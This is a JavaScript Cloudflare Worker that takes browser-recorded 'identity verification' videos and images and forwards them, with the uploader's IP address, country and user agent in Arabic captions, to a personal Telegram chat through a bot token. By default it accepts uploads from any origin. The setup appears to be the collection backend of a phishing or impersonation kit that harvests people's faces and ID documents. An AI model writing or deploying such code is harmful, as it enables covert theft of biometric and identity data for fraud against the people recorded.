// Cloudflare Worker: forwards a recorded verification video to a Telegram bot.
//
// Cloudflare's free plan accepts request bodies up to 100 MB, so we keep the
// browser's recording at full quality (1280x720 @ ~4 Mbps) and forward the
// raw bytes here. The worker wraps them in multipart/form-data and calls
// Telegram's sendVideo (falls back to sendDocument on container errors).
//
// Secrets required (set with `wrangler secret put <NAME>`):
//   TELEGRAM_BOT_TOKEN  — from @BotFather
//   TELEGRAM_CHAT_ID    — your numeric chat id (use @userinfobot)
//
// Optional plain var in wrangler.toml:
//   ALLOWED_ORIGIN — restrict CORS. Leave empty/unset to allow any origin.

// Telegram Bot API caps sendVideo at 50 MB.
const TELEGRAM_MAX_BYTES = 50 * 1024 * 1024;

function corsHeaders(env, request) {
  const requestOrigin = request.headers.get('Origin') || '';
  let allow = '*';
  if (env.ALLOWED_ORIGIN) {
    const allowed = env.ALLOWED_ORIGIN.split(',').map((s) => s.trim()).filter(Boolean);
    allow = allowed.includes(requestOrigin) ? requestOrigin : allowed[0];
  }
  return {
    'Access-Control-Allow-Origin': allow,
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'content-type, x-mime-type',
    'Vary': 'Origin',
  };
}

function json(body, status, headers) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { ...headers, 'Content-Type': 'application/json; charset=utf-8' },
  });
}

export default {
  async fetch(request, env) {
    const cors = corsHeaders(env, request);

    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: cors });
    }
    if (request.method !== 'POST') {
      return json({ error: 'method not allowed' }, 405, { ...cors, Allow: 'POST' });
    }

    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
      console.error('missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
      return json({ error: 'telegram not configured on server' }, 500, cors);
    }

    const buffer = await request.arrayBuffer();
    if (buffer.byteLength === 0) {
      return json({ error: 'empty body' }, 400, cors);
    }
    if (buffer.byteLength > TELEGRAM_MAX_BYTES) {
      return json({ error: `body exceeds Telegram's 50 MB limit` }, 413, cors);
    }

    const mime = (request.headers.get('x-mime-type')
      || request.headers.get('content-type')
      || 'video/webm').split(';')[0].trim();
    const isImage = mime.startsWith('image/');
    const ext = mime.includes('mp4')  ? 'mp4'
              : mime.includes('png')  ? 'png'
              : mime.includes('jpeg') ? 'jpg'
              :                         'webm';
    const kind = isImage ? 'image' : 'verification';
    const filename = `${kind}-${Date.now()}.${ext}`;

    const ip = request.headers.get('cf-connecting-ip') || 'unknown';
    const country = request.cf?.country || '';
    const ua = (request.headers.get('user-agent') || 'unknown').slice(0, 140);
    const sizeKB = (buffer.byteLength / 1024).toFixed(0);
    const captionTitle = isImage ? 'صورة جديدة' : 'جلسة تحقق هوية جديدة';
    const caption = [
      captionTitle,
      `الوقت: ${new Date().toISOString()}`,
      `الحجم: ${sizeKB} KB`,
      `IP: ${ip}${country ? ` (${country})` : ''}`,
      `UA: ${ua}`,
    ].join('\n');

    const send = async (endpoint, fieldName) => {
      const form = new FormData();
      form.append('chat_id', String(env.TELEGRAM_CHAT_ID));
      form.append('caption', caption);
      if (fieldName === 'video') form.append('supports_streaming', 'true');
      form.append(fieldName, new Blob([buffer], { type: mime }), filename);

      const res = await fetch(
        `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/${endpoint}`,
        { method: 'POST', body: form },
      );
      const body = await res.json().catch(() => ({}));
      return { ok: res.ok && body.ok, status: res.status, body };
    };

    // Pick primary endpoint by mime type. sendDocument is the universal fallback.
    const primary = isImage
      ? { endpoint: 'sendPhoto', field: 'photo' }
      : { endpoint: 'sendVideo', field: 'video' };

    try {
      let result = await send(primary.endpoint, primary.field);
      if (!result.ok) {
        console.warn(`${primary.endpoint} failed, retrying as document`, result);
        result = await send('sendDocument', 'document');
        if (!result.ok) {
          console.error('sendDocument also failed', result);
          return json({
            error: 'telegram rejected upload',
            details: result.body.description || 'unknown',
          }, 502, cors);
        }
        return json({ ok: true, file: filename, mode: 'document' }, 200, cors);
      }
      console.log('sent', { filename, bytes: buffer.byteLength, msg: result.body.result?.message_id });
      return json({ ok: true, file: filename, mode: primary.field }, 200, cors);
    } catch (err) {
      console.error('handler error', err);
      return json({ error: err.message || 'internal error' }, 500, cors);
    }
  },
};
